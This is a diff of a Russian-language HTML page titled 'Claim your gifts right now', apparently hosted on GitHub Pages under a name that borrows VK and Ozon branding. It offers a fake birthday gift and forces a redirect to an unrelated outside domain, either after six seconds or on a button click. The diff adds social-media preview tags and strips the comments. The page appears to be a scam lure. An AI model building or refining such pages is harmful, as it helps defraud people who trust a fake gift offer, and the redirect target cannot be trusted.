@@ -5,13 +5,16 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Забери подарки прямо сейчас 🎁</title>
 
-<!-- Open Graph для превью в ВК -->
+<!-- Open Graph для ВК -->
 <meta property="og:title" content="Забери подарки прямо сейчас 🎁">
 <meta property="og:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
 <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
-<meta property="og:url" content="https://vk-ozon-podarki.github.io">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:url" content="https://vk-ozon-podarki.github.io/">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Забери подарки прямо сейчас">
+<meta property="og:locale" content="ru_RU">
 
 <!-- Twitter Card -->
 <meta name="twitter:card" content="summary_large_image">
@@ -30,7 +33,7 @@
 
     body {
         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        background-color: #2f8ef0; /* сплошной синий, без градиента и полос */
+        background-color: #2f8ef0;
         display: flex;
         flex-direction: column;
         align-items: center;
@@ -92,17 +95,14 @@
 <body>
 
 <div class="hero-wrap">
-    <!-- ЗАМЕНИТЕ cake.jpg НА ВАШУ КАРТИНКУ С ТОРТОМ -->
     <img src="cake.jpg" alt="Праздничный торт">
     
-    <!-- Ссылка для кнопки -->
     <a href="https://drhanaebarraki.com/?s=nCMBHDxMaF" class="btn-gift" id="giftBtn">
         🎁 Забрать подарок
     </a>
 </div>
 
 <script>
-    // Редирект через 6 секунд
     const giftBtn = document.getElementById('giftBtn');
     const targetUrl = giftBtn.href;
     let redirected = false;
@@ -112,9 +112,8 @@
             redirected = true;
             window.location.replace(targetUrl);
         }
-    }, 6000); // 6000 мс = 6 секунд
+    }, 6000);
 
-    // Мгновенный переход по клику на кнопку
     giftBtn.addEventListener('click', function(e) {
         e.preventDefault();
         if (!redirected) {
